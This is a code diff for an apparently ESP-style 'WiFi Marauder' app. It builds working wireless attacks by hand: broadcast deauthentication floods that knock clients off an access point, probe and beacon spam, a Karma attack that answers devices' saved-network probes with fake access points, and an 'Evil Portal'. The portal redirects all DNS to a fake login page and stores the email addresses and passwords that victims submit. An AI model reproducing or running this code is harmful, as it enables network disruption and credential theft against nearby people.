@@ -8,10 +8,15 @@
 //     Scan APs  → AP List → AP Detail → Deauth / Probe Flood / Signal Monitor
 //                                      → badmsg Attack / Sleep Attack
 //     Sniff     → Beacons / Probes / Deauths / PMKID / Raw Monitor
-//     Attacks   → Beacon Spam / Beacon by AP List / Rickroll / Karma / Evil Portal
-//     Network   → ARP Scan / Port Scan / Set MAC
+//     Attacks   → Beacon Spam / Beacon by AP List / Rickroll / Karma /
+//                 Evil Portal / Set MAC
 //     Scripts   → run scripts.txt from SD card
 //     About
+//
+// This is a radio-takeover app: at launch it calls wifi_acquire() to claim the
+// WiFi radio for its whole lifetime (one permission prompt), so features switch
+// with no disconnect/reconnect churn. Network tools that need a normal STA
+// connection (ARP/port scan) live in a separate app, not here.
 //
 // Build:
 //   cd examples/wifi-marauder
@@ -24,6 +29,10 @@
 #include "nema_api.h"
 
 // ── Constants ──────────────────────────────────────────────────────────────────
+
+// Bump this by hand on every change so you can verify on-device (About screen)
+// that the build you flashed/cp'd is actually the one running.
+#define APP_VERSION       "3.3.3"
 
 #define MAX_APS           20
 #define MAX_SSID_LEN      33
@@ -165,9 +174,6 @@ typedef enum {
     SCR_MAC_SPOOF,
     SCR_KARMA,
     SCR_EVIL_PORTAL,
-    SCR_NET_TOOLS,
-    SCR_NET_SCAN,
-    SCR_PORT_SCAN,
     SCR_SCRIPTS,
 } Screen;
 
@@ -598,6 +604,7 @@ static void inject_badmsg(const Ap* ap) {
         wifi_inject(ap->channel, frame, pos);
         delay(50);
     }
+    wifi_inject_release();  // release lease; clears "Radio in use" banner
 }
 
 // sleep: null data frame with PM=1 from spoofed AP → all STAs stop receiving
@@ -617,13 +624,13 @@ static void inject_sleep(const Ap* ap) {
         wifi_inject(ap->channel, frame, 24);
         delay(50);
     }
+    wifi_inject_release();  // release lease; clears "Radio in use" banner
 }
 
 // ── Main Menu ─────────────────────────────────────────────────────────────────
 #define MMENU_SCAN     1
 #define MMENU_SNIFF    2
 #define MMENU_ATTACKS  3
-#define MMENU_NET      4
 #define MMENU_SCRIPTS  5
 #define MMENU_ABOUT    6
 
@@ -633,7 +640,6 @@ static int screen_main(void) {
     ui_button("Scan APs",    MMENU_SCAN);
     ui_button("Sniff",       MMENU_SNIFF);
     ui_button("Attacks",     MMENU_ATTACKS);
-    ui_button("Network",     MMENU_NET);
     ui_button("Scripts",     MMENU_SCRIPTS);
     ui_button("About",       MMENU_ABOUT);
     ui_end();
@@ -758,18 +764,31 @@ static int screen_ap_detail(void) {
 
 static void screen_deauthing(void) {
     const Ap* ap = &g_aps[g_selected];
-    int started = (wifi_deauth_start(ap->bssid, ap->channel) == 0);
-    int packets = 0;
-    char ev_buf[EVENT_BUF_SZ];
+    unsigned char bssid[6];
+    int have = parse_hex_mac(ap->bssid, bssid);
 
+    // 802.11 deauthentication frame — built HERE in the app. The kernel only
+    // provides the generic wifi_inject() primitive; it has no concept of "deauth".
+    unsigned char frame[26] = {
+        0xC0, 0x00,                          // FC: deauth (type 0, subtype 12)
+        0x00, 0x00,                          // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast (deauth all clients)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: spoofed AP BSSID
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
+        0x00, 0x00,                          // Seq ctrl
+        0x07, 0x00,                          // Reason 7: class-3 frame from nonassoc STA
+    };
+    nema_memcpy(frame + 10, bssid, 6);
+    nema_memcpy(frame + 16, bssid, 6);
+
+    int packets = 0;
     while (1) {
-        int n = wifi_wait_event(ev_buf, sizeof(ev_buf), 100);
-        if (n > 0) packets++;
+        if (have) { wifi_inject(ap->channel, frame, sizeof(frame)); packets++; }
 
         ui_begin();
         ui_title("Deauthing...");
-        if (!started) {
-            ui_text("Not supported");
+        if (!have) {
+            ui_text("Bad BSSID");
         } else {
             char line[40] = "Target: ";
             int used = 8;
@@ -785,9 +804,10 @@ static void screen_deauthing(void) {
 
         int key = ui_poll_event();
         if (key == EV_BACK || key == 1) break;
+        delay(100);   // ~10 Hz; the app paces its own loop, no kernel thread
     }
-
-    wifi_deauth_stop();
+    // No stop call: the radio is held for the whole session (wifi_acquire), and
+    // we simply stopped injecting. Nothing app-specific lingers in the kernel.
     g_screen = SCR_AP_DETAIL;
 }
 
@@ -796,13 +816,30 @@ static void screen_deauthing(void) {
 static void screen_probe_flood(void) {
     const Ap* ap = &g_aps[g_selected];
     int ch = ap->channel > 0 ? ap->channel : 1;
-    int started = (wifi_probe_flood_start(ap->ssid, ch) == 0);
-    int ticks = 0;
-    char ev_buf[EVENT_BUF_SZ];
+    const char* ssid = ap->ssid;            // "" → wildcard probe
+    int ssid_len = 0; while (ssid[ssid_len] && ssid_len < 32) ssid_len++;
+    static unsigned char probe_seq = 0;
+    int probes = 0;
 
     while (1) {
-        int n = wifi_wait_event(ev_buf, sizeof(ev_buf), 100);
-        if (n > 0) ticks++;
+        // 802.11 probe-request frame, built in-app: 24-byte header + SSID IE +
+        // Supported Rates IE. Kernel only provides wifi_inject().
+        unsigned char frame[100] = {
+            0x40, 0x00, 0x00, 0x00,              // FC: probe req
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
+            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // SA: rotated per burst
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // BSSID: wildcard
+            0x00, 0x00,                          // Seq ctrl
+        };
+        frame[15] = probe_seq++;
+        int pos = 24;
+        frame[pos++] = 0x00; frame[pos++] = (unsigned char)ssid_len;   // SSID IE
+        for (int i = 0; i < ssid_len; i++) frame[pos++] = (unsigned char)ssid[i];
+        static const unsigned char rates[10] =
+            {0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};        // Rates IE
+        for (int i = 0; i < 10; i++) frame[pos++] = rates[i];
+        wifi_inject(ch, frame, pos);
+        probes++;
 
         ui_begin();
         {
@@ -811,16 +848,14 @@ static void screen_probe_flood(void) {
             str_append(hdr, sizeof(hdr), &used, itoa_s(ch));
             ui_title(hdr);
         }
-        if (!started) {
-            ui_text("Not supported");
-        } else {
+        {
             char line[40] = "SSID: ";
             int used = 6;
             str_append(line, sizeof(line), &used, ap->ssid[0] ? ap->ssid : "(wildcard)");
             ui_text(line);
-            char cnt[32] = "Probes sent: ~";
-            used = 14;
-            str_append(cnt, sizeof(cnt), &used, itoa_s(ticks * 20));
+            char cnt[32] = "Probes sent: ";
+            used = 13;
+            str_append(cnt, sizeof(cnt), &used, itoa_s(probes));
             ui_text(cnt);
         }
         ui_row_begin();
@@ -832,16 +867,10 @@ static void screen_probe_flood(void) {
 
         int key = ui_poll_event();
         if (key == EV_BACK || key == 3) break;
-        if (key == 1 && ch < 13) {
-            ch++;
-            if (started) { wifi_probe_flood_stop(); started = (wifi_probe_flood_start(ap->ssid, ch) == 0); }
-        } else if (key == 2 && ch > 1) {
-            ch--;
-            if (started) { wifi_probe_flood_stop(); started = (wifi_probe_flood_start(ap->ssid, ch) == 0); }
-        }
+        if (key == 1 && ch < 13) ch++;          // next inject just uses new ch
+        else if (key == 2 && ch > 1) ch--;
+        delay(50);   // ~20 Hz
     }
-
-    wifi_probe_flood_stop();
     g_screen = SCR_AP_DETAIL;
 }
 
@@ -1304,6 +1333,7 @@ static int screen_attacks_menu(void) {
     ui_button("Rickroll",          3);
     ui_button("Karma",             4);
     ui_button("Evil Portal",       5);
+    ui_button("Set MAC",           6);
     ui_button("< Back",            99);
     ui_end();
 
@@ -1314,10 +1344,53 @@ static int screen_attacks_menu(void) {
     else if (ev == 3) g_screen = SCR_RICKROLLING;
     else if (ev == 4) g_screen = SCR_KARMA;
     else if (ev == 5) g_screen = SCR_EVIL_PORTAL;
+    else if (ev == 6) g_screen = SCR_MAC_SPOOF;
     return ev;
 }
 
 // ── Beacon Spam ───────────────────────────────────────────────────────────────
+
+// Broadcast one 802.11 beacon per SSID in a NUL-separated buffer. Frames are
+// built HERE in the app; the kernel only provides wifi_inject().
+static void beacon_spam_round(const char* ssids_buf, int count, int channel) {
+    const char* p = ssids_buf;
+    for (int i = 0; i < count; i++) {
+        int slen = 0; while (p[slen] && slen < 32) slen++;
+        unsigned char frame[80] = {
+            0x80, 0x00,                          // FC: beacon
+            0xFF, 0xFF,                          // Duration
+            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: broadcast
+            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // SA: fake (varied per SSID)
+            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0x00,  // BSSID
+            0x00, 0x00,                          // Seq ctrl
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // timestamp
+            0x64, 0x00,                          // beacon interval 100 TU
+            0x01, 0x04,                          // caps: ESS + Short Slot
+        };
+        frame[15] = (unsigned char)(i & 0xFF);   // vary SA/BSSID last byte
+        frame[21] = (unsigned char)(i & 0xFF);
+        int pos = 36;
+        frame[pos++] = 0x00;                     // SSID IE: tag
+        frame[pos++] = (unsigned char)slen;      //          len
+        for (int j = 0; j < slen; j++) frame[pos++] = (unsigned char)p[j];
+        // Supported Rates IE — many scanners ignore a beacon without it.
+        frame[pos++] = 0x01; frame[pos++] = 0x08;
+        frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8b;
+        frame[pos++] = 0x96; frame[pos++] = 0x0c; frame[pos++] = 0x12;
+        frame[pos++] = 0x18; frame[pos++] = 0x24;
+        // DS Parameter Set IE — advertise the ACTUAL channel we're TX-ing on.
+        frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = (unsigned char)channel;
+        int rc = wifi_inject(channel, frame, pos);
+        if (i == 0) {   // diagnostic: confirm the radio accepts the TX
+            char m[28] = "ch="; int u = 3;
+            str_append(m, sizeof(m), &u, itoa_s(channel));
+            str_append(m, sizeof(m), &u, " rc=");
+            str_append(m, sizeof(m), &u, itoa_s(rc));
+            nema_log("info", "Beacon", m);
+        }
+        while (*p) p++; p++;                      // next NUL-separated SSID
+    }
+}
 
 static void screen_beacon_spam(void) {
     const char* ssids_buf;
@@ -1356,26 +1429,26 @@ static void screen_beacon_spam(void) {
         ssids_buf = kDefaultSpamSsids; ssids_count = DEFAULT_SPAM_COUNT;
     }
 
-    int started = (wifi_beacon_spam_start(ssids_buf, ssids_count) == 0);
-    int ticks = 0;
-    char ev_buf[EVENT_BUF_SZ];
-
+    // Hop channels 1/6/11 each round so devices parked on ANY channel see the
+    // fake APs — a single fixed channel (the old behaviour) was invisible to
+    // clients connected elsewhere. Same recipe as deauth (which works): plain
+    // inject, no promiscuous, follow the channel.
+    static const int kHop[3] = {1, 6, 11};
+    int rounds = 0;
     while (1) {
-        int ev_n = wifi_wait_event(ev_buf, sizeof(ev_buf), 200);
-        if (ev_n > 0) ticks++;
+        beacon_spam_round(ssids_buf, ssids_count, kHop[rounds % 3]);
+        rounds++;
 
         ui_begin();
         ui_title(g_beacon_ap_list_mode ? "Beacon by AP List" : "Beacon Spam");
-        if (!started) {
-            ui_text("Not supported on this board");
-        } else {
+        {
             char line[32] = "SSIDs: ";
             int used = 7;
             str_append(line, sizeof(line), &used, itoa_s(ssids_count));
             ui_text(line);
-            char cnt[32] = "Ticks: ";
-            used = 7;
-            str_append(cnt, sizeof(cnt), &used, itoa_s(ticks));
+            char cnt[32] = "Rounds: ";
+            used = 8;
+            str_append(cnt, sizeof(cnt), &used, itoa_s(rounds));
             ui_text(cnt);
             ui_text("Broadcasting beacons...");
         }
@@ -1384,33 +1457,28 @@ static void screen_beacon_spam(void) {
 
         int key = ui_poll_event();
         if (key == EV_BACK || key == 1) break;
+        delay(100);
     }
-
-    wifi_beacon_spam_stop();
     g_screen = SCR_ATTACKS_MENU;
 }
 
 // ── Rickroll ──────────────────────────────────────────────────────────────────
 
 static void screen_rickrolling(void) {
-    int started = (wifi_beacon_spam_start(kRickrollSsids, RICKROLL_COUNT) == 0);
-    int ticks = 0;
-    char ev_buf[EVENT_BUF_SZ];
-
+    static const int kHop[3] = {1, 6, 11};   // hop so any nearby device sees it
+    int rounds = 0;
     while (1) {
-        int ev_n = wifi_wait_event(ev_buf, sizeof(ev_buf), 200);
-        if (ev_n > 0) ticks++;
+        beacon_spam_round(kRickrollSsids, RICKROLL_COUNT, kHop[rounds % 3]);
+        rounds++;
 
         ui_begin();
         ui_title("Rickroll");
-        if (!started) {
-            ui_text("Not supported on this board");
-        } else {
-            ui_text("Never gonna give you up");
-            ui_text("Never gonna let you down");
-            char cnt[32] = "Ticks: ";
-            int used = 7;
-            str_append(cnt, sizeof(cnt), &used, itoa_s(ticks));
+        ui_text("Never gonna give you up");
+        ui_text("Never gonna let you down");
+        {
+            char cnt[32] = "Rounds: ";
+            int used = 8;
+            str_append(cnt, sizeof(cnt), &used, itoa_s(rounds));
             ui_text(cnt);
         }
         ui_button("Stop", 1);
@@ -1418,9 +1486,8 @@ static void screen_rickrolling(void) {
 
         int key = ui_poll_event();
         if (key == EV_BACK || key == 1) break;
+        delay(100);
     }
-
-    wifi_beacon_spam_stop();
     g_screen = SCR_ATTACKS_MENU;
 }
 
@@ -1428,45 +1495,94 @@ static void screen_rickrolling(void) {
 
 static void screen_karma(void) {
     g_karma_count = 0;
-    int started = (wifi_karma_start() == 0);
-    char ev_buf[EVENT_BUF_SZ];
+    // Karma: sniff probe requests, reply with a matching fake AP. Built in-app
+    // from the monitor + inject primitives — the kernel has no "karma" concept.
+    static const int kHop[3] = {1, 6, 11};
+    int hop_i = 0, dwell = 0;
+    int open = (wifi_monitor_open(kHop[0]) == 0);
+    static unsigned char fbuf[FRAME_BUF_SZ];
+    int probes_seen = 0;
 
     while (1) {
-        int n = wifi_wait_event(ev_buf, sizeof(ev_buf), 100);
-        if (n > 0 && g_karma_count < MAX_KARMA_HITS) {
-            // Event: {"type":"karma_hit","data":{"ssid":"...","sta":"..."}}
-            const char* sp = find_str(ev_buf, "\"ssid\":\"");
-            if (sp) {
-                sp += 8;
-                KarmaHit* h = &g_karma_hits[g_karma_count++];
-                int i = 0;
-                while (*sp && *sp != '"' && i < MAX_SSID_LEN - 1) h->ssid[i++] = *sp++;
-                h->ssid[i] = '\0';
-                const char* mp = find_str(ev_buf, "\"sta\":\"");
-                if (mp) {
-                    mp += 7; i = 0;
-                    while (*mp && *mp != '"' && i < MAX_BSSID_LEN - 1) h->sta[i++] = *mp++;
-                    h->sta[i] = '\0';
+        if (open) {
+            // Hop the monitor channel (~3 ticks dwell each) — directed probes
+            // are sent on the device's AP channel, not just channel 1.
+            if (++dwell >= 3) { dwell = 0; hop_i = (hop_i + 1) % 3;
+                                wifi_monitor_open(kHop[hop_i]); }
+            // DRAIN the whole monitor ring each tick. Reading just one frame per
+            // render lets the 128-slot ring overflow between renders and DROP the
+            // rare DIRECTED probes (the ones carrying a real SSID like "unit1602")
+            // while keeping only the flood of wildcard/broadcast probes — which is
+            // exactly why the list looked empty/wildcard before.
+            for (int drain = 0; drain < 128; drain++) {
+                int n = wifi_monitor_read(fbuf, sizeof(fbuf), 0);  // non-blocking
+                if (n <= 0) break;
+                int type    = (fbuf[0] >> 2) & 0x3;
+                int subtype = (fbuf[0] >> 4) & 0xF;
+                if (n < 28 || type != 0 || subtype != 4 || fbuf[24] != 0x00) continue;
+                int ssid_len = fbuf[25];
+                probes_seen++;
+                // Skip wildcard (len 0) and null/noise SSIDs — can't echo those.
+                if (ssid_len <= 0 || ssid_len > 32 || 26 + ssid_len > n) continue;
+                if (fbuf[26] < 0x20 || fbuf[26] >= 0x7f) continue;
+
+                // Probe response echoing the requested SSID.
+                unsigned char resp[120] = {
+                    0x50, 0x00, 0x00, 0x00,              // FC: probe response
+                    0,0,0,0,0,0,                         // DA = probe req SA (filled)
+                    0xDE,0xAD,0xBE,0xEF,0xC0,0xDE,       // SA: fake BSSID
+                    0xDE,0xAD,0xBE,0xEF,0xC0,0xDE,       // BSSID
+                    0x00,0x00,                           // Seq
+                    0,0,0,0,0,0,0,0,                     // timestamp
+                    0x64,0x00,                           // interval
+                    0x11,0x04,                           // caps
+                };
+                for (int i = 0; i < 6; i++) resp[4 + i] = fbuf[10 + i];  // DA
+                resp[15] = (unsigned char)(fbuf[11] ^ 0xAA);
+                resp[21] = resp[15];
+                int pos = 36;
+                resp[pos++] = 0x00; resp[pos++] = (unsigned char)ssid_len;
+                for (int i = 0; i < ssid_len; i++) resp[pos++] = fbuf[26 + i];
+                static const unsigned char rates[10] =
+                    {0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
+                for (int i = 0; i < 10; i++) resp[pos++] = rates[i];
+                wifi_inject(kHop[hop_i], resp, pos);   // reply on the probe's channel
+
+                // Record the SSID, deduplicated.
+                char ssid[MAX_SSID_LEN];
+                int si = 0;
+                for (; si < ssid_len && si < MAX_SSID_LEN - 1; si++)
+                    ssid[si] = (char)fbuf[26 + si];
+                ssid[si] = '\0';
+                int dup = 0;
+                for (int k = 0; k < g_karma_count; k++)
+                    if (str_eq(g_karma_hits[k].ssid, ssid)) { dup = 1; break; }
+                if (!dup && g_karma_count < MAX_KARMA_HITS) {
+                    str_copy(g_karma_hits[g_karma_count].ssid, ssid, MAX_SSID_LEN);
+                    g_karma_hits[g_karma_count].sta[0] = '\0';
+                    g_karma_count++;
                 }
             }
         }
 
         ui_begin();
         ui_title("Karma Attack");
-        if (!started) {
-            ui_text("Not supported");
+        if (!open) {
+            ui_text("Monitor not supported");
         } else {
-            char cnt[32] = "Replies: ";
-            int used = 9;
-            str_append(cnt, sizeof(cnt), &used, itoa_s(g_karma_count));
+            char cnt[40] = "Probes seen: "; int used = 13;
+            str_append(cnt, sizeof(cnt), &used, itoa_s(probes_seen));
             ui_text(cnt);
-            ui_text("Responding to probes...");
-            for (int i = 0; i < g_karma_count && i < 5; i++) {
-                char line[48] = "> ";
-                int u2 = 2;
-                str_append(line, sizeof(line), &u2, g_karma_hits[i].ssid[0]
-                           ? g_karma_hits[i].ssid : "(wildcard)");
-                ui_text(line);
+            if (g_karma_count == 0) {
+                ui_text("No named probes yet");
+                ui_text("(most devices send wildcard)");
+            } else {
+                ui_text("Saved networks probed:");
+                for (int i = 0; i < g_karma_count && i < 5; i++) {
+                    char line[48] = "> "; int u2 = 2;
+                    str_append(line, sizeof(line), &u2, g_karma_hits[i].ssid);
+                    ui_text(line);
+                }
             }
         }
         ui_button("Stop", 1);
@@ -1476,17 +1592,50 @@ static void screen_karma(void) {
         if (key == EV_BACK || key == 1) break;
     }
 
-    wifi_karma_stop();
+    if (open) wifi_monitor_close();
     g_screen = SCR_ATTACKS_MENU;
 }
 
 // ── Evil Portal ───────────────────────────────────────────────────────────────
 
+// Captive login page served by the in-app HTTP server.
+static const char kPortalHtml[] =
+    "<!DOCTYPE html><html><head><title>WiFi Portal</title>"
+    "<style>body{font-family:sans-serif;max-width:400px;margin:60px auto;text-align:center}"
+    "input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}"
+    "button{background:#0070f3;color:#fff;padding:10px 32px;border:none;border-radius:4px;font-size:16px}"
+    "h2{color:#333}</style></head><body>"
+    "<h2>Network Login</h2><p>Sign in to get internet access</p>"
+    "<form method=POST action=/submit>"
+    "<input name=email type=email placeholder='Email address' required>"
+    "<input name=pass type=password placeholder='Password' required>"
+    "<br><button type=submit>Connect</button></form></body></html>";
+
+// Build a catch-all DNS A-record reply (every query → 192.168.4.1), in-app.
+static int ep_dns_reply(const unsigned char* q, int qlen,
+                        unsigned char* r, int rmax) {
+    if (qlen < 12 || rmax < qlen + 16) return 0;
+    nema_memcpy(r, q, qlen);
+    r[2] = 0x81; r[3] = 0x80;            // flags: response, recursion available
+    r[6] = 0x00; r[7] = 0x01;            // answer count = 1
+    r[8] = r[9] = r[10] = r[11] = 0;     // no NS/AR
+    int pos = qlen;
+    r[pos++] = 0xC0; r[pos++] = 0x0C;    // name pointer to question
+    r[pos++] = 0x00; r[pos++] = 0x01;    // type A
+    r[pos++] = 0x00; r[pos++] = 0x01;    // class IN
+    r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x00; r[pos++] = 0x01;  // TTL 1s
+    r[pos++] = 0x00; r[pos++] = 0x04;    // RDLENGTH 4
+    r[pos++] = 192; r[pos++] = 168; r[pos++] = 4; r[pos++] = 1;          // 192.168.4.1
+    return pos;
+}
+
+// Evil portal built ENTIRELY in-app from generic primitives (Plan 91): a soft AP
+// + a UDP:53 DNS catch-all + a TCP:80 HTTP server, all polled from this loop.
+// The kernel has no "evil portal" concept.
 static void screen_evil_portal(void) {
     static int ssid_idx = 0;
     g_ep_cred_count = 0;
-    int started = 0;
-    char ev_buf[EVENT_BUF_SZ];
+    int started = 0, dns = -1, http = -1;
 
     while (1) {
         if (!started) {
@@ -1501,24 +1650,62 @@ static void screen_evil_portal(void) {
 
             int ev = ui_wait_event();
             if (ev == EV_BACK || ev == 99) { g_screen = SCR_ATTACKS_MENU; return; }
-            if (ev == 1) { ssid_idx = (ssid_idx + 1) % N_EP_SSIDS; }
+            if (ev == 1) ssid_idx = (ssid_idx + 1) % N_EP_SSIDS;
             if (ev == 2) {
-                started = (wifi_evil_portal_start(kEpSsids[ssid_idx], 0, 0) == 0);
-            }
-        } else {
-            int n = wifi_wait_event(ev_buf, sizeof(ev_buf), 100);
-            if (n > 0 && g_ep_cred_count < MAX_EP_CREDS) {
-                const char* dp = find_str(ev_buf, "ep_creds");
-                if (dp) {
-                    dp = find_str(dp, "\"data\":\"");
-                    if (dp) {
-                        dp += 8;
-                        char* c = g_ep_creds[g_ep_cred_count++];
-                        int ci = 0;
-                        while (*dp && *dp != '"' && ci < 127) c[ci++] = *dp++;
-                        c[ci] = '\0';
+                if (wifi_ap_start(kEpSsids[ssid_idx], 1, 1) == 0) {
+                    dns  = net_udp_open(53);
+                    http = net_tcp_listen(80);
+                    started = (dns >= 0 && http >= 0);
+                    if (!started) {
+                        if (dns  >= 0) net_close(dns);
+                        if (http >= 0) net_close(http);
+                        wifi_ap_stop();
                     }
                 }
+            }
+        } else {
+            // DNS: answer every query with 192.168.4.1 (drives the captive prompt).
+            static unsigned char dq[512], dr[600];
+            unsigned int from_ip = 0, from_port = 0;
+            int qn = net_udp_recv(dns, dq, sizeof(dq), &from_ip, &from_port);
+            if (qn >= 12) {
+                int rn = ep_dns_reply(dq, qn, dr, sizeof(dr));
+                if (rn > 0) net_udp_send(dns, from_ip, (int)from_port, dr, rn);
+            }
+
+            // HTTP: serve the login page; capture POST /submit bodies.
+            int c = net_tcp_accept(http);
+            if (c >= 0) {
+                static unsigned char hbuf[1280];
+                int n = net_tcp_recv(c, hbuf, sizeof(hbuf) - 1);
+                if (n > 0) {
+                    hbuf[n] = '\0';
+                    char* req = (char*)hbuf;
+                    if (req[0] == 'P' && find_str(req, "/submit")) {
+                        const char* body = find_str(req, "\r\n\r\n");
+                        if (body && g_ep_cred_count < MAX_EP_CREDS) {
+                            body += 4;
+                            char* dst = g_ep_creds[g_ep_cred_count++];
+                            int ci = 0;
+                            while (*body && ci < 127) dst[ci++] = *body++;
+                            dst[ci] = '\0';
+                        }
+                        const char* thanks =
+                            "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\n\r\n"
+                            "<html><body><h2>Connected!</h2></body></html>";
+                        net_tcp_send(c, (const unsigned char*)thanks, str_len(thanks));
+                    } else {
+                        char hdr[96]; int used = 0; hdr[0] = '\0';
+                        int hl = str_len(kPortalHtml);
+                        str_append(hdr, sizeof(hdr), &used,
+                            "HTTP/1.0 200 OK\r\nContent-Type:text/html\r\nContent-Length:");
+                        str_append(hdr, sizeof(hdr), &used, itoa_s(hl));
+                        str_append(hdr, sizeof(hdr), &used, "\r\n\r\n");
+                        net_tcp_send(c, (const unsigned char*)hdr, used);
+                        net_tcp_send(c, (const unsigned char*)kPortalHtml, hl);
+                    }
+                }
+                net_close(c);
             }
 
             ui_begin();
@@ -1534,38 +1721,23 @@ static void screen_evil_portal(void) {
                 str_append(cnt, sizeof(cnt), &used, itoa_s(g_ep_cred_count));
                 ui_text(cnt);
             }
-            for (int i = 0; i < g_ep_cred_count && i < 4; i++) {
-                ui_text(g_ep_creds[i]);
-            }
+            for (int i = 0; i < g_ep_cred_count && i < 4; i++) ui_text(g_ep_creds[i]);
             if (g_ep_cred_count == 0) ui_text("Waiting for victims...");
             ui_button("Stop", 1);
             ui_end();
 
             int key = ui_poll_event();
             if (key == EV_BACK || key == 1) break;
+            delay(5);   // keep the DNS/HTTP poll responsive without spinning the CPU
         }
     }
 
-    if (started) wifi_evil_portal_stop();
+    if (started) {
+        if (dns  >= 0) net_close(dns);
+        if (http >= 0) net_close(http);
+        wifi_ap_stop();
+    }
     g_screen = SCR_ATTACKS_MENU;
-}
-
-// ── Network Tools Menu ────────────────────────────────────────────────────────
-
-static int screen_net_tools(void) {
-    ui_begin();
-    ui_title("Network Tools");
-    ui_button("ARP Scan",  1);
-    ui_button("Port Scan", 2);
-    ui_button("Set MAC",   3);
-    ui_button("< Back",    99);
-    ui_end();
-    int ev = ui_wait_event();
-    if (ev == EV_BACK || ev == 99) g_screen = SCR_MAIN;
-    else if (ev == 1) g_screen = SCR_NET_SCAN;
-    else if (ev == 2) g_screen = SCR_PORT_SCAN;
-    else if (ev == 3) g_screen = SCR_MAC_SPOOF;
-    return ev;
 }
 
 // ── MAC Spoof ─────────────────────────────────────────────────────────────────
@@ -1594,162 +1766,7 @@ static void screen_mac_spoof(void) {
             ui_button("OK", 1); ui_end(); ui_wait_event();
         }
     }
-    g_screen = SCR_NET_TOOLS;
-}
-
-// ── ARP / Network Scan ────────────────────────────────────────────────────────
-
-static void screen_net_scan(void) {
-    g_arp_count = 0;
-
-    // Check STA connection
-    static char sta_buf[64];
-    int sta_n = wifi_sta_status(sta_buf, sizeof(sta_buf));
-    if (sta_n <= 0 || sta_buf[0] != 'c') {
-        ui_begin();
-        ui_title("ARP Scan");
-        ui_text("WiFi not connected!");
-        ui_text("Connect via Settings first.");
-        ui_button("< Back", 1);
-        ui_end();
-        ui_wait_event();
-        g_screen = SCR_NET_TOOLS;
-        return;
-    }
-
-    // Show IP
-    ui_begin();
-    ui_title("ARP Scan");
-    ui_text("Scanning subnet .1-.30");
-    ui_text("~4 seconds, please wait...");
-    {
-        char line[48] = "My IP: ";
-        int used = 7;
-        const char* ip_start = find_str(sta_buf, "\t");
-        if (ip_start) str_append(line, sizeof(line), &used, ip_start + 1);
-        ui_text(line);
-    }
-    ui_end();
-
-    static char arp_buf[512];
-    int n = wifi_arp_scan(arp_buf, sizeof(arp_buf));
-
-    // Parse "IP\n" list
-    if (n > 0) {
-        const char* p = arp_buf;
-        while (*p && g_arp_count < MAX_ARP_HOSTS) {
-            int i = 0;
-            while (*p && *p != '\n' && i < 19) g_arp_hosts[g_arp_count][i++] = *p++;
-            g_arp_hosts[g_arp_count][i] = '\0';
-            if (*p == '\n') p++;
-            if (i > 0) g_arp_count++;
-        }
-    }
-
-    // Show results
-    while (1) {
-        ui_begin();
-        {
-            char hdr[32] = "ARP Scan — Found: ";
-            int used = 18;
-            str_append(hdr, sizeof(hdr), &used, itoa_s(g_arp_count));
-            ui_title(hdr);
-        }
-        for (int i = 0; i < g_arp_count; i++) {
-            ui_button(g_arp_hosts[i], i + 1);
-        }
-        if (g_arp_count == 0) ui_text("No hosts found");
-        ui_button("Rescan", 90);
-        ui_button("< Back", 99);
-        ui_end();
-
-        int ev = ui_wait_event();
-        if (ev == EV_BACK || ev == 99) break;
-        if (ev == 90) {
-            // Rescan
-            g_arp_count = 0;
-            n = wifi_arp_scan(arp_buf, sizeof(arp_buf));
-            if (n > 0) {
-                const char* p = arp_buf;
-                while (*p && g_arp_count < MAX_ARP_HOSTS) {
-                    int i = 0;
-                    while (*p && *p != '\n' && i < 19) g_arp_hosts[g_arp_count][i++] = *p++;
-                    g_arp_hosts[g_arp_count][i] = '\0';
-                    if (*p == '\n') p++;
-                    if (i > 0) g_arp_count++;
-                }
-            }
-        } else if (ev >= 1 && ev <= g_arp_count) {
-            str_copy(g_port_target, g_arp_hosts[ev - 1], sizeof(g_port_target));
-            g_screen = SCR_PORT_SCAN;
-            return;
-        }
-    }
-    g_screen = SCR_NET_TOOLS;
-}
-
-// ── Port Scan ─────────────────────────────────────────────────────────────────
-
-static void screen_port_scan(void) {
-    g_open_count = 0;
-    if (!g_port_target[0]) str_copy(g_port_target, "192.168.1.1", sizeof(g_port_target));
-
-    // Show scanning
-    ui_begin();
-    {
-        char hdr[48] = "Scanning: ";
-        int used = 10;
-        str_append(hdr, sizeof(hdr), &used, g_port_target);
-        ui_title(hdr);
-    }
-    ui_text("Probing common ports...");
-    ui_text("(~1.5s per port)");
-    ui_end();
-
-    for (int i = 0; i < N_COMMON_PORTS && g_open_count < MAX_OPEN_PORTS; i++) {
-        if (wifi_tcp_probe(g_port_target, kCommonPorts[i], 1500) == 0) {
-            g_open_ports[g_open_count++] = kCommonPorts[i];
-        }
-    }
-
-    // Show results
-    while (1) {
-        ui_begin();
-        {
-            char hdr[48] = "Ports: ";
-            int used = 7;
-            str_append(hdr, sizeof(hdr), &used, g_port_target);
-            ui_title(hdr);
-        }
-        {
-            char cnt[32] = "Open ports: ";
-            int used = 12;
-            str_append(cnt, sizeof(cnt), &used, itoa_s(g_open_count));
-            ui_text(cnt);
-        }
-        for (int i = 0; i < g_open_count; i++) {
-            char line[24] = "  port ";
-            int used = 7;
-            str_append(line, sizeof(line), &used, itoa_s(g_open_ports[i]));
-            str_append(line, sizeof(line), &used, "  OPEN");
-            ui_text(line);
-        }
